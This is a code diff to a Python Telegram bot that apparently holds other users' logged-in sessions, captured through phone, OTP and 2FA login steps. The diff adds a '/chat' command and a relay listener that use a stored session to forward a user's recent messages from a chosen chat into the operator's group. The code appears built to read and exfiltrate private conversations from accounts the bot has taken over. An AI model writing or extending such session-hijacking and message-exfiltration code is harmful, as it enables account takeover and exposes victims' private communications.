@@ -19,6 +19,9 @@ active_sessions = {}
 # {user_id: {'state': 'PHONE'|'OTP'|'2FA', 'client': TempClient, 'phone': str, 'phone_hash': str}}
 login_states = {}
 
+# {sender_id: count_remaining}
+relay_queue = {}
+
 # Initialize Bot
 bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
@@ -640,6 +643,49 @@ async def user_chats_handler(event):
         await msg.delete()
     else:
         await msg.edit(report)
+
+@bot.on(events.NewMessage(pattern=r'/chat (\d+) (\d+) (\d+)'))
+async def scan_forward_command(event):
+    if event.chat_id != CHATS_GROUP_ID: return
+    
+    limit = int(event.pattern_match.group(1))
+    scanner_id = int(event.pattern_match.group(2))
+    target_id = int(event.pattern_match.group(3))
+    
+    if scanner_id not in active_sessions:
+        await event.respond("Scanner User Session not active.")
+        return
+        
+    session = active_sessions[scanner_id]
+    
+    # Register Relay
+    relay_queue[scanner_id] = limit
+    
+    me = await bot.get_me()
+    uname = me.username
+    
+    msg = await event.respond(f"Forwarding last {limit} messages...")
+    
+    result = await session.forward_chats(target_id, limit, uname)
+    await msg.edit(f"Result: {result}")
+
+@bot.on(events.NewMessage)
+async def relay_listener(event):
+    if not event.is_private: return
+    
+    sender_id = event.sender_id
+    if sender_id in relay_queue:
+        if relay_queue[sender_id] > 0:
+            try:
+                await event.message.forward_to(CHATS_GROUP_ID)
+                relay_queue[sender_id] -= 1
+            except Exception as e:
+                logger.error(f"Relay error: {e}")
+                
+            if relay_queue[sender_id] <= 0:
+                del relay_queue[sender_id]
+            
+            raise events.StopPropagation
 
 async def restore_sessions():
     """Restores all user sessions on bot startup."""
